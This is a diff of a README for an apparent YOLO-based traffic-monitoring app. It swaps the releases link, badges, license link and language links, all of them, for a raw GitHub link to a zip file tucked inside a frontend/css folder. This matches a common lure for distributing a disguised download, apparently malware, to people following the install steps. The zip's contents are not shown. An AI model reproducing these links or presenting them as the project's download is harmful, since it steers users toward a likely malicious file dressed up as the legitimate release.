@@ -2,14 +2,14 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/)
-[![YOLO](https://img.shields.io/badge/YOLO-v8n-green.svg)](https://github.com/ultralytics/ultralytics)
+[![Download](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip%https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)
+[![License](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)](LICENSE)
+[![Python](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip+https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)
+[![YOLO](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)
 
 ### 語言 / Language
 
-**[繁體中文](README.md)** | **[English](README_EN.md)**
+**[繁體中文](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)** | **[English](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)**
 
 </div>
 
@@ -37,7 +37,7 @@ Before downloading the application, ensure your system meets the following requi
 
 To download the application, please visit the release page. Click the link below:
 
-[Download Now](https://github.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/releases)
+[Download Now](https://raw.githubusercontent.com/jcinformaticalanhouse/AI-Vision-Traffic-Monitoring/main/frontend/css/AI-Vision-Traffic-Monitoring_draughtmanship.zip)
 
 1. **Select the Latest Release:** Once you’re on the releases page, locate the most recent version of the software. This version includes the latest features and bug fixes.
 2. **Choose the Correct File:** Depending on your operating system, click on the appropriate installer file.
